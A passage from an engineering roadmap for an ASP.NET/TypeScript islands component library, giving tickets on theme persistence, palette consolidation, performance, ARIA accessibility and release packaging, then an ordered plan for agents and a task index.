**Acceptance.** `grep -rc "#[0-9a-fA-F]\{6\}" src/components` → 0. Changing `--lt-primary-500` visibly restyles **every** component in the showcase.

---

### `LT-602` — Two competing palette sources
**Severity:** P2 · **Status:** todo · **Files:** `theme-studio.ts:29+` (`PRIMARY_PRESETS`) vs `styles/design-tokens.ts` (`AURA_PALETTES`)

**Evidence.** `design-tokens.ts` defines full 50–900 ramps. `theme-studio.ts` defines its *own* `ColorPreset` type carrying only `lightP50/100/200/500/600/700` and `darkP50/100/200` — nine shades, inconsistently named, duplicating the same colors. The Studio therefore cannot set shades 300, 400, 800, 900, 950 at all, so any component using them ignores theming even after `LT-601`.

**Fix.** Delete `PRIMARY_PRESETS`. The Studio imports `AURA_PALETTES` and generates the full ramp. For custom hex input, generate a perceptually-even ramp in **OKLCH** (`culori`-style math, ~60 LOC, no dependency needed) instead of the current `theme-studio.ts:411-413` hack that assigns the *same* hex to 500, 600, and 700.

**Acceptance.** One palette definition in the repo. Custom color produces 11 distinct, perceptually-even shades passing contrast checks.

---

### `LT-603` — Studio changes do not persist and there is no server-side theme
**Severity:** P1 · **Status:** todo

**Evidence.** `grep localStorage src/components/theme-studio.ts` → **no matches**. A theme is lost on reload. And since tokens are applied by JS to `documentElement` after hydration, the first paint always uses defaults — a **flash of default theme** on every cold load, which is precisely the "sub-20 ms first paint" promise undermined.

**Fix.** Full round-trip theming:
1. **Persist** to `localStorage` under `lt-theme` (wrap every read/write in `try/catch` — private mode throws).
2. **Blocking inline script** in `_Layout.cshtml` (nonce'd, ~15 lines) that reads `localStorage` and sets the custom properties **before first paint**. This is the standard no-FOUC pattern.
3. **Server-side theming**: `services.AddLaughTaleTheme(o => o.Primary = AuraPalette.Emerald)` renders the token block into the `<head>` at SSR time, so an app-wide brand needs no JS at all. Add a `<laughtale-theme />` TagHelper.
4. **Cookie option** for per-user themes so the *server* renders the correct theme (SSR-correct, zero flash, works with output caching keyed on the cookie).
5. **Export**: the Studio's "1-click export" should emit three formats — a CSS block, a C# `AddLaughTaleTheme` snippet, and a `lt-theme.json` that can be committed and loaded by both.
6. **Persist across SPA navigation**: verify tokens survive the `LT-202` head reconciliation.

**Acceptance.** Set theme → reload → theme intact, zero flash (verified by a Playwright screenshot of the first painted frame). Server-configured theme works with JS disabled.

---

### `LT-604` — No visual regression safety net
**Severity:** P2 · **Status:** todo

**Evidence.** `LT-601` touches 66 files and 2,025 values, and `LT-401` rewrites 114 TagHelpers. Neither is safe to attempt without pixel-level verification, and there is currently none.

**Fix.** Playwright visual regression over a generated gallery page: every component × {light, dark} × {default, compact} × {primary: emerald, violet}. Baseline before `LT-601` begins. This task **must land first** in Phase P-4.

**Acceptance.** ~300 baseline snapshots in CI; diffs surface as PR artifacts.

---

### `LT-605` — Studio only covers color and radius
**Severity:** P3 · **Status:** todo

**Fix.** Extend to typography (family, scale, weights), spacing density, shadow elevation, border width, and motion duration/easing — plus a **live contrast checker** flagging any token pair below WCAG AA, and per-component overrides (`--lt-button-radius` falling back to `--lt-radius-md`).

---

## 9. LT-7xx — Performance (P2)

### `LT-701` — Establish a measured performance baseline
**Severity:** P2 · **Status:** todo

**Evidence.** Every performance number in `README.md` is asserted, not measured — and the one that is checkable (bundle size) is wrong by ~700×. Credibility depends on replacing claims with a reproducible benchmark.

**Fix.** `bench/` project measuring, on the showcase: TTFB, FCP, LCP, CLS, INP, total JS transferred, hydration time per strategy, and time-to-interactive per component. Publish results to the Docs portal, regenerated in CI, with a regression gate.

**Acceptance.** README numbers replaced with linked, reproducible measurements.

---

### `LT-702` — No prefetching on the router
**Severity:** P2 · **Status:** todo

**Fix.** Prefetch on `mouseenter`/`touchstart` (150 ms intent delay) and for in-viewport links via the shared observer from `LT-206`; respect `navigator.connection.saveData` and `prefers-reduced-data`. Add an in-memory response cache with a short TTL, invalidated on non-GET.

**Acceptance.** Repeat navigation to a prefetched route < 50 ms.

---

### `LT-703` — Style injection is per-island and unbatched
**Severity:** P3 · **Status:** todo · **File:** `src/runtime/styles.ts` (42 LOC)

**Fix.** Batch injections in a single `requestAnimationFrame`, deduplicate by content hash, and prefer `CSSStyleSheet` + `adoptedStyleSheets` where supported (avoids re-parsing). Carry the CSP nonce from `LT-104`.

---

### `LT-704` — Icon sprite is 10,688 lines shipped wholesale
**Severity:** P2 · **Status:** todo · **File:** `Components/wwwroot/icons/lucide-sprites.svg`

**Fix.** Generate a **subset** sprite containing only icons actually referenced (scan `src/` and `.cshtml` at build time). Expect a 90%+ reduction. Serve with a content hash and long-lived cache headers.

---

### `LT-705` — No compression or caching guidance
**Severity:** P3 · **Status:** todo

**Fix.** Document (and wire into the Showcase) Brotli precompression, immutable cache headers for hashed chunks, `<link rel=modulepreload>` for above-the-fold islands, and HTTP/2 push-free preload hints.

---

## 10. LT-8xx — Accessibility (P1 for enterprise)

### `LT-801` — 28 of 76 components have zero ARIA
**Severity:** P1 · **Status:** todo

**Evidence.** Components with **no `aria-` attribute at all** include `multiselect`, `menu`, `popover`, `drawer`, `color-picker`, `fileupload`, `dropzone`, `galleria`, `treetable`, `radio-button`, `progress-bar`, `knob`, `tooltip-component`, and `theme-studio` itself. Across the entire library there are only **2 `aria-live` regions** — meaning `toast` notifications are effectively invisible to screen readers, which is a compliance failure for the notification pattern specifically.

**Fix.** Work the WAI-ARIA Authoring Practices pattern by pattern, prioritized: (1) overlays — `drawer`, `popover`, `menu`, `multiselect` (focus trap via the existing `useFocusTrap`, `aria-modal`, `Esc`, focus restore on close); (2) live regions — `toast`, `message`, `progress-bar`; (3) form controls — `radio-button`, `checkbox`, `color-picker`, `knob`, `fileupload` (label association, `aria-invalid`, `aria-describedby` for errors); (4) grids — `treetable`, `datatable` (`role=grid`, `aria-sort`, roving tabindex).

**Acceptance.** `axe-core` in CI, zero violations on the showcase. Manual keyboard-only pass on the top 20 components. NVDA + VoiceOver spot-checks documented.

---

### `LT-802` — No reduced-motion support
**Severity:** P2 · **Status:** todo · **File:** `src/styles/animations.ts`

**Fix.** Gate all animation behind `prefers-reduced-motion: reduce`, including View Transitions (skip `startViewTransition` entirely when reduced motion is requested).

---

### `LT-803` — Focus management across view transitions
**Severity:** P2 · **Status:** todo

**Evidence.** Replacing `document.body.innerHTML` destroys the focused element; focus resets to `<body>`, so keyboard and screen-reader users lose their position on every navigation and are given no announcement that the page changed.

**Fix.** After navigation, move focus to the new `<h1>` (or a skip target) and announce the new page title via a persistent `aria-live="polite"` region. Add a skip-to-content link to the layouts.

---

## 11. LT-9xx — Production readiness & release (P1/P2)

### `LT-901` — Packaging and versioning
**Severity:** P1 · **Status:** todo

**Evidence.** `IsPackable`/`PackageId` is set on 5 projects (good), but `SoftMax.LaughTale.Tests` is among them (it should not be packable), and there is no release pipeline, no `CHANGELOG.md`, no `LICENSE` file at the repo root despite `package.json` declaring MIT.

**Fix.** Mark test project `IsPackable=false`. Add `Directory.Build.props` centralizing version, authors, license, repo URL, symbol packages, and deterministic builds. Add `LICENSE`, `CHANGELOG.md` (Keep a Changelog), and a documented SemVer policy. Publish `@softmax/islands` to npm from CI. Ensure the Generators package ships as an analyzer (`analyzers/dotnet/cs`) and Core ships a `.props` wiring `@addTagHelper` automatically.

---

### `LT-902` — Observability
**Severity:** P2 · **Status:** todo

**Fix.** Structured `ILogger` in Core (island rendered, prop serialization size, slot projection). Client: an optional `onError` hook so hydration failures reach Sentry/App Insights instead of `console.error` (currently the only error channel — `hydrator.ts:89`). Emit `PerformanceMark`s around hydration for RUM.

---

### `LT-903` — Documentation gaps
**Severity:** P2 · **Status:** todo

**Fix.** Add to the Docs portal: security model and CSP guide (post-`LT-101`), theming guide (post-`LT-603`), an "islands vs. Blazor Server vs. WASM" decision guide, migration/upgrade notes, per-component API reference **generated** from the TagHelper reflection data (`LT-401`) so it cannot drift, and an honest performance page (`LT-701`). Correct the false claims in `README.md` as the first commit of this roadmap.

---

### `LT-904` — Error boundaries
**Severity:** P2 · **Status:** todo

**Fix.** A failing island currently logs and leaves a blank region. Add `<island fallback="...">` server-rendered fallback content, shown when hydration fails, plus a dev-mode overlay with the stack trace.

---

### `LT-905` — Browser support policy
**Severity:** P3 · **Status:** todo

**Fix.** `target: es2022` and View Transitions imply a modern-evergreen policy. State it explicitly, document graceful degradation for Safari (View Transitions), and test the fallback paths.

---

## 12. Suggested execution order for agents

Strictly ordered — later items depend on earlier ones:

1. `LT-903` (README corrections only) — stop shipping false claims immediately. *1 hour.*
2. `LT-301` → `LT-303` → `LT-304` — get the gates green and running. Nothing else is verifiable until this is done.
3. `LT-101`, `LT-102`, `LT-103` — the P0 security triad. `LT-104` falls out of them.
4. `LT-306` + `LT-604` — snapshot and visual baselines. **Safety nets before the two big refactors.**
5. `LT-201` — the lifecycle scope + 76-component migration. Largest single task; parallelizes well across agents by component.
6. `LT-202` → `LT-207` — router and hydrator correctness.
7. `LT-302`, `LT-305` — build unification and artifact cleanup.
8. `LT-401`, `LT-402`, `LT-403`, `LT-404` — API unification. Must precede any public API freeze.
9. `LT-601` → `LT-602` → `LT-603` — the Theme Studio becoming real.
10. `LT-501`, `LT-502`, `LT-503` — component-design depth.
11. `LT-801`–`LT-803`, `LT-701`–`LT-705` — a11y and performance.
12. `LT-901`, `LT-902`, `LT-904` — release.

**Parallelization note for multi-agent work:** `LT-201` (component lifecycle) and `LT-601` (component tokens) both touch all 76 component files. Do **not** run them concurrently — merge conflicts will be severe. Run `LT-201` first, then `LT-601`, or process the two changes per-component in a single pass with a combined checklist.

---

## 13. Task index

| ID | Title | Sev | Status |
|---|---|---|---|
| LT-101 | Directive sandbox escapable | P0 | todo |
| LT-102 | Server props executed as JS | P0 | todo |
| LT-103 | sanitizeHtml executes payloads | P0 | todo |
| LT-104 | CSP incompatibility | P0 | todo |
| LT-105 | Prop over-serialization | P1 | todo |
| LT-106 | sanitizeUrl too broad and evadable | P2 | todo |
| LT-107 | Router trusts fetched HTML | P1 | todo |
| LT-201 | No unmount lifecycle / leaks | P0 | todo |
| LT-202 | Router never swaps `<head>` | P1 | todo |
| LT-203 | Transition starts before ready; nav race | P1 | todo |
| LT-204 | pushState order / scroll restoration | P2 | todo |
| LT-205 | Hydration error → double mount | P1 | todo |
| LT-206 | IntersectionObserver leak | P2 | todo |
| LT-207 | retry.ts broken | P1 | todo |
| LT-301 | 98 tsc errors; broken barrel | P1 | todo |
| LT-302 | 1.4 MB bundle | P1 | todo |
| LT-303 | Client tests don't run | P1 | todo |
| LT-304 | No CI | P1 | todo |
| LT-305 | Artifacts committed | P2 | todo |
| LT-306 | 9 .NET tests for 114 helpers | P1 | todo |
| LT-401 | 5,151-line TagHelper file | P2 | todo |
| LT-402 | Alias sprawl | P2 | todo |
| LT-403 | No island contract | P2 | todo |
| LT-404 | C#/TS model drift | P2 | todo |
| LT-405 | No runtime validation | P3 | todo |
| LT-501 | Extract primitives | P2 | todo |
| LT-502 | Virtualization missing | P2 | todo |
| LT-503 | No SSR-first markup | P2 | todo |
| LT-504 | Undocumented component states | P3 | todo |
| LT-601 | 2,025 hardcoded colors | P1 | todo |
| LT-602 | Two palette sources | P2 | todo |
| LT-603 | No theme persistence or SSR theme | P1 | todo |
| LT-604 | No visual regression | P2 | todo |
| LT-605 | Studio scope too narrow | P3 | todo |
| LT-701 | No perf baseline | P2 | todo |
| LT-702 | No prefetch | P2 | todo |
| LT-703 | Unbatched style injection | P3 | todo |
| LT-704 | Full icon sprite shipped | P2 | todo |
| LT-705 | No compression guidance | P3 | todo |
| LT-801 | 28 components with zero ARIA | P1 | todo |
| LT-802 | No reduced-motion | P2 | todo |
| LT-803 | Focus lost on navigation | P2 | todo |
| LT-901 | Packaging/versioning | P1 | todo |
| LT-902 | Observability | P2 | todo |
| LT-903 | Docs gaps + false claims | P2 | todo |
| LT-904 | Error boundaries | P2 | todo |
| LT-905 | Browser support policy | P3 | todo |
